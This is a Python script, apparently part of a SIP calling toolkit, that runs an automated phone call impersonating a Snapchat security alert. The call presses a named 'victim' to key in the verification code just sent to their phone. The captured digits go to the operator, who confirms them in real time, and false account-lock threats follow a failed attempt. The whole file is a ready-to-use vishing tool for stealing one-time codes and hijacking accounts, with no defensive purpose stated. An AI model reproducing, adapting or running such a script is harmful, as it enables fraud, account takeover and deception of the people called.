import asyncio

from PySIP.call_handler import CallHandler


def typing_cb():
    print("Victim typing code..")


async def snapchat_script(
    call_handler: CallHandler, victim_name: str, confirmation_code_length: int = 6
):
    DELAY_ERR_MESSAGE = f"You did not enter any code, please enter the {confirmation_code_length}-digit code we sent to your number."
    MAX_ATTEMPTS = 2

    try:
        # Phase 1
        call_handler.voice = "en-CA-ClaraNeural"
        await call_handler.say(
            f"Welcome {victim_name}, this is a security alert from Snapchat."
        )
        await call_handler.say(
            "We have detected suspicious activities on your account, and we need to verify your identity to prevent unauthorized access."
        )

        # Phase 2
        code_correct = False
        attempts = 0
        asyncio.create_task(call_handler.dtmf_handler.started_typing(typing_cb))

        while not code_correct and attempts < MAX_ATTEMPTS:
            await call_handler.say(
                f"To verify your identity, please enter the {confirmation_code_length}-digit code we sent to your number."
            )
            dtmf_result = await call_handler.gather_and_say(
                length=confirmation_code_length, delay=13, delay_msg=DELAY_ERR_MESSAGE
            )

            if dtmf_result:
                print("The DTMF result is:-> ", dtmf_result)
                entered_code = input(f"Is the code '{dtmf_result}' correct? (y/n) ")
                if entered_code.lower() == "y":
                    code_correct = True
                    stream_id = await call_handler.say(
                        "Thank you for verifying your identity. Your account has been secured."
                    )
                    await stream_id.wait_finished()
                    await call_handler.hangup()
                    print("Script Snapchat completed running..")
                else:
                    attempts += 1
                    if attempts == MAX_ATTEMPTS:
                        stream = await call_handler.say(
                            "You have failed to verify your identity, for security reasons, we will have to lock your account."
                        )
                        await stream.wait_finished()
                        await call_handler.hangup()
                        print("Script Snapchat failed due to maximum attempts reached.")
                    else:
                        await call_handler.say(
                            "The code you entered is incorrect, please try again."
                        )
            else:
                stream = await call_handler.say(
                    "You did not enter any code. For security reasons, we will have to lock your account."
                )
                await stream.wait_finished()
                await call_handler.hangup()
                print("Script Snapchat failed due to no code entered.")

    except RuntimeError:
        print("The call is hanged up. Stopping the script...")
